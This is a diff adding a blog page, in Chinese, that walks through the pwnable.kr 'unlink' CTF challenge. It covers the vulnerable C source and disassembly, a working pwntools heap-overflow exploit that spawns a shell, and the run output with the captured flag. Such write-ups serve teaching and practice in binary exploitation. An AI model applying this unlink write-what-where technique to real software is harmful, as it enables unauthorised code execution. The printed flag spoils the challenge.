@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言这是一道简化了的linux下malloc堆溢出漏洞利用。需要理解linux下关于glibc的堆管理的相关内容，参考 分析分析源码unlink.c12345678910111213141516171819202122232425262728293031323334353637383940typedef struct tagOBJ&amp;#123;	struct tagOBJ* fd;	struct t">
+<meta name="keywords" content="pwnable.kr,PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr-unlink">
+<meta property="og:url" content="http://yoursite.com/2018/02/21/pwnable.kr-unlink/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="前言这是一道简化了的linux下malloc堆溢出漏洞利用。需要理解linux下关于glibc的堆管理的相关内容，参考 分析分析源码unlink.c12345678910111213141516171819202122232425262728293031323334353637383940typedef struct tagOBJ&amp;#123;	struct tagOBJ* fd;	struct t">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-04T07:10:57.820Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr-unlink">
+<meta name="twitter:description" content="前言这是一道简化了的linux下malloc堆溢出漏洞利用。需要理解linux下关于glibc的堆管理的相关内容，参考 分析分析源码unlink.c12345678910111213141516171819202122232425262728293031323334353637383940typedef struct tagOBJ&amp;#123;	struct tagOBJ* fd;	struct t">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/02/21/pwnable.kr-unlink/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>pwnable.kr-unlink | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/21/pwnable.kr-unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.kr-unlink
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-02-21 20:26:00" itemprop="dateCreated datePublished" datetime="2018-02-21T20:26:00+08:00">2018-02-21</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:10:57" itemprop="dateModified" datetime="2018-08-04T15:10:57+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一道简化了的linux下<code>malloc</code>堆溢出漏洞利用。需要理解linux下关于<code>glibc的堆管理</code>的相关内容，<a href="http://blog.csdn.net/maokelong95/article/details/51989081#allocated-chunk" target="_blank" rel="noopener">参考</a></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>分析源码<code>unlink.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">	OBJ* BK;</span><br><span class="line">	OBJ* FD;</span><br><span class="line">	BK=P-&gt;bk;</span><br><span class="line">	FD=P-&gt;fd;</span><br><span class="line">	FD-&gt;bk=BK;</span><br><span class="line">	BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">	OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">	OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">	OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">	A-&gt;fd = B;</span><br><span class="line">	B-&gt;bk = A;</span><br><span class="line">	B-&gt;fd = C;</span><br><span class="line">	C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</span><br><span class="line">	<span class="comment">// heap overflow!</span></span><br><span class="line">	gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// exploit this unlink!</span></span><br><span class="line">	unlink(B);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>程序很简单完全就是教学版的<code>unlink堆溢出利用</code>。程序在<code>gets(A-&gt;buf)</code>处存在堆溢出漏洞，之后调用<code>unlink(B)</code>函数把<code>B</code>节点从链表中取下来。这个函数中，如果控制了<code>P</code>节点的<code>fb</code>和<code>bk</code>指针，那么就可以造成任意地址写入，写入过程是<code>将bk写入fb+4表示的地址处，将fb写入bk表示的地址处</code>。要想写入想要的地址，必须要保证两步写入操作不会触发写异常保护，这里需要控制<code>esp</code>的值来使<code>main</code>函数在返回时执行<code>ret</code>指令将<code>shell</code>地址赋给<code>eip</code>。<br>下面分析<code>main</code>函数反汇编代码，来构造<code>payload</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">0804852f &lt;main&gt;:</span><br><span class="line"> 804852f:	8d 4c 24 04          	lea    0x4(%esp),%ecx</span><br><span class="line"> 8048533:	83 e4 f0             	and    $0xfffffff0,%esp</span><br><span class="line"> 8048536:	ff 71 fc             	pushl  -0x4(%ecx)</span><br><span class="line"> 8048539:	55                   	push   %ebp</span><br><span class="line"> 804853a:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 804853c:	51                   	push   %ecx</span><br><span class="line"> 804853d:	83 ec 14             	sub    $0x14,%esp</span><br><span class="line"> 8048540:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048543:	68 00 04 00 00       	push   $0x400</span><br><span class="line"> 8048548:	e8 53 fe ff ff       	call   80483a0 &lt;malloc@plt&gt;</span><br><span class="line"> 804854d:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048550:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048553:	6a 10                	push   $0x10</span><br><span class="line"> 8048555:	e8 46 fe ff ff       	call   80483a0 &lt;malloc@plt&gt;</span><br><span class="line"> 804855a:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804855d:	89 45 ec             	mov    %eax,-0x14(%ebp)</span><br><span class="line"> 8048560:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048563:	6a 10                	push   $0x10</span><br><span class="line"> 8048565:	e8 36 fe ff ff       	call   80483a0 &lt;malloc@plt&gt;</span><br><span class="line"> 804856a:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804856d:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048570:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048573:	6a 10                	push   $0x10</span><br><span class="line"> 8048575:	e8 26 fe ff ff       	call   80483a0 &lt;malloc@plt&gt;</span><br><span class="line"> 804857a:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804857d:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048580:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048583:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048586:	89 10                	mov    %edx,(%eax)</span><br><span class="line"> 8048588:	8b 55 ec             	mov    -0x14(%ebp),%edx</span><br><span class="line"> 804858b:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 804858e:	89 50 04             	mov    %edx,0x4(%eax)</span><br><span class="line"> 8048591:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048594:	8b 55 f0             	mov    -0x10(%ebp),%edx</span><br><span class="line"> 8048597:	89 10                	mov    %edx,(%eax)</span><br><span class="line"> 8048599:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 804859c:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 804859f:	89 50 04             	mov    %edx,0x4(%eax)</span><br><span class="line"> 80485a2:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 80485a5:	8d 45 ec             	lea    -0x14(%ebp),%eax</span><br><span class="line"> 80485a8:	50                   	push   %eax</span><br><span class="line"> 80485a9:	68 98 86 04 08       	push   $0x8048698</span><br><span class="line"> 80485ae:	e8 cd fd ff ff       	call   8048380 &lt;printf@plt&gt;</span><br><span class="line"> 80485b3:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485b6:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 80485b9:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 80485bc:	50                   	push   %eax</span><br><span class="line"> 80485bd:	68 b8 86 04 08       	push   $0x80486b8</span><br><span class="line"> 80485c2:	e8 b9 fd ff ff       	call   8048380 &lt;printf@plt&gt;</span><br><span class="line"> 80485c7:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485ca:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 80485cd:	68 d8 86 04 08       	push   $0x80486d8</span><br><span class="line"> 80485d2:	e8 d9 fd ff ff       	call   80483b0 &lt;puts@plt&gt;</span><br><span class="line"> 80485d7:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485da:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 80485dd:	83 c0 08             	add    $0x8,%eax</span><br><span class="line"> 80485e0:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 80485e3:	50                   	push   %eax</span><br><span class="line"> 80485e4:	e8 a7 fd ff ff       	call   8048390 &lt;gets@plt&gt;</span><br><span class="line"> 80485e9:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485ec:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 80485ef:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 80485f2:	e8 0d ff ff ff       	call   8048504 &lt;unlink&gt;</span><br><span class="line"> 80485f7:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80485fa:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line"> 80485ff:	8b 4d fc             	mov    -0x4(%ebp),%ecx</span><br><span class="line"> 8048602:	c9                   	leave  </span><br><span class="line"> 8048603:	8d 61 fc             	lea    -0x4(%ecx),%esp</span><br><span class="line"> 8048606:	c3                   	ret    </span><br><span class="line"> 8048607:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 8048609:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 804860b:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 804860d:	66 90                	xchg   %ax,%ax</span><br><span class="line"> 804860f:	90                   	nop</span><br></pre></td></tr></table></figure></p>
+<p>可以发现<code>A,B,C</code>三个节点的栈地址分别是<code>ebp-0x14,ebp-0xc,ebp-0x10</code>，在函数结尾发现<code>ret</code>指令之前是<code>lea -0x4(%ecx),%esp</code>,说明<code>esp</code>最后会被<code>ecx</code>修改，而<code>ecx</code>又会被指令<code>mov -0x4(%ebp),%ecx</code>修改。于是要想把esp所表示地址的内容改为shell的地址，可以通过更改<code>ebp-4</code>的内容为<code>shell地址+4</code>来实现,而<code>ebp-4</code>的地址可以通过<code>A</code>地址来计算，它们的相对偏移为<code>ebp-4-(ebp-0x14)=16</code>。则堆块的内存布局如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-------------+--------------+   &lt;= A</span><br><span class="line">|   fd        |    bk        |</span><br><span class="line">|shell_addr   |  aaaa        |</span><br><span class="line">+-------------+--------------+   &lt;= B</span><br><span class="line">|    aaaaaaaa(chunk size)    |</span><br><span class="line">|heap_addr+8+4|stack_addr+16 |</span><br><span class="line">|            buf             |</span><br><span class="line">+-------------+--------------+</span><br></pre></td></tr></table></figure></p>
+<p>要注意的是题目平台是64位系统，所以存储<code>chunk size</code>信息需要8字节，exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">s = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'unlink'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">shell_addr = <span class="number">0x080484eb</span></span><br><span class="line">ss = s.run(<span class="string">'./unlink'</span>)</span><br><span class="line">ss.recvuntil(<span class="string">'here is stack address leak: '</span>)</span><br><span class="line">stack_addr = int(ss.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">ss.recvuntil(<span class="string">'here is heap address leak: '</span>)</span><br><span class="line">heap_addr = int(ss.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">ss.sendline(p32(shell_addr)+<span class="string">'a'</span>*<span class="number">12</span>+p32(heap_addr+<span class="number">8</span>+<span class="number">4</span>)+p32(stack_addr+<span class="number">16</span>))</span><br><span class="line">ss.interactive()</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># python 1.py</span></span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[!] Couldn<span class="string">'t check security settings on '</span>pwnable.kr<span class="string">'</span></span><br><span class="line"><span class="string">[+] Opening new channel: '</span>./unlink<span class="string">': Done</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">now that you have leaks, get shell!</span></span><br><span class="line"><span class="string">$ $ ls</span></span><br><span class="line"><span class="string">flag  intended_solution.txt  unlink  unlink.c</span></span><br><span class="line"><span class="string">$ $ cat flag</span></span><br><span class="line"><span class="string">conditional_write_what_where_from_unl1nk_explo1t</span></span><br><span class="line"><span class="string">$ $</span></span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做这道题目搜索了很多关于<code>glibc堆管理</code>的相关内容，学到了不少，这里推荐<a href="https://chybeta.github.io/2017/08/19/Software-Security-Learning/" target="_blank" rel="noopener">一篇博文</a>，它记录了很多关于软件安全方向的知识链接，很适合学习。另外pwable.kr的第一部分终于做完了，学到了不少基础知识，希望能在二进制的道路上越走越远。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/14/pwnable.kr-asm/" rel="next" title="pwnable.kr-asm">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-asm
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/25/pwnable.kr-brain fuck/" rel="prev" title="pwnable.kr-brain fuck">
+                pwnable.kr-brain fuck <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r00tnb</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
